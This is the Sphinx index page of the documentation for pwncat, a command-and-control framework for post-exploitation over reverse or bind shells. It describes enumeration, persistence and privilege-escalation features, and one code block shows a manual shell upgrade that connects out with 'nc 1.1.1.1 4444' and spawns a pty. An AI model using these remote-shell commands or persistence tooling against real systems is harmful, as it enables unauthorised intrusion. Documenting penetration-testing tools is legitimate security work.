.. pwncat documentation master file, created by
   sphinx-quickstart on Mon May 18 01:30:55 2020.
   You can adapt this file completely to your liking, but it should at least
   contain the root `toctree` directive.

pwncat - living off the land... in style!
=========================================

pwncat is a command and control framework which turns a basic reverse or bind
shell into a fully-featured exploitation platform. After initial connection, the
framework will probe the remote system to identify useful binaries natively
available on the target system. It will then attempt to start a pseudoterminal
on the remote host and provide you with raw terminal access.

pwncat doesn't stop there, though. On top of raw terminal access, pwncat can
programmatically interact with the remote host alongside your terminal access.
pwncat provides you with a local shell interface which can utilize your
connection for enumeration, file upload/download, automatic persistence
installation and even automated privilege escalation.

This abstracted remote host access is also available to the user via custom
commands, privilege escalation methods, and persistence methods. You can find
out more about this framework under the API Documentation below!

What's wrong with just a reverse shell?
---------------------------------------

You may be familiar with the common method of getting raw terminal access with
reverse shells. It normally goes something like this:

.. code-block:: bash

    # Connect to a remote bind shell
    nc 1.1.1.1 4444
    # Spawn a remote pseudoterminal
    remote$ python -c "import pty; pty.spawn('/bin/bash')"
    # Background your raw shell
    remote$ C-z
    # Set local terminal to raw mode
    local$ stty raw -echo
    # Foreground your remote shell
    local$ fg
    # You now have a full terminal that doesn't exit on C-c and
    # supports keyboard shortcuts, history, graphical terminal
    # applications, etc.
    remote$

This works well. However, the added steps to get a reverse shell are laborious
after a while. Also, the danger of losing your remote shell by accidentally
pressing "C-c" prior to gaining raw access is high. This was the original
inspiration of this project.

Where Do I Begin?
-----------------

``pwncat`` has a lot features, and is easily extensible if you have ideas! Check
out the "Basic Usage" section next for examples of connecting to remote hosts.
If you ever find there is a piece of the documentation missing, check out the help
documentation at the local prompt, accessed with the ``--help/-h`` parameter of any
command. If the information you're looking for doesn't exist, please submit an issue
on GitHub. If you're feeling adventurous, take a look at the API documentation as
well. Pull requests are always welcome!

.. toctree::
    :maxdepth: -1
    :caption: Contents:

    installation.rst
    usage.rst
    configuration.rst
    modules.rst
    enum.rst
    privesc.rst
    persist.rst
    commands/index.rst
    extending/index.rst
    api/modules.rst

Indices and tables
==================

* :ref:`genindex`
* :ref:`modindex`
* :ref:`search`
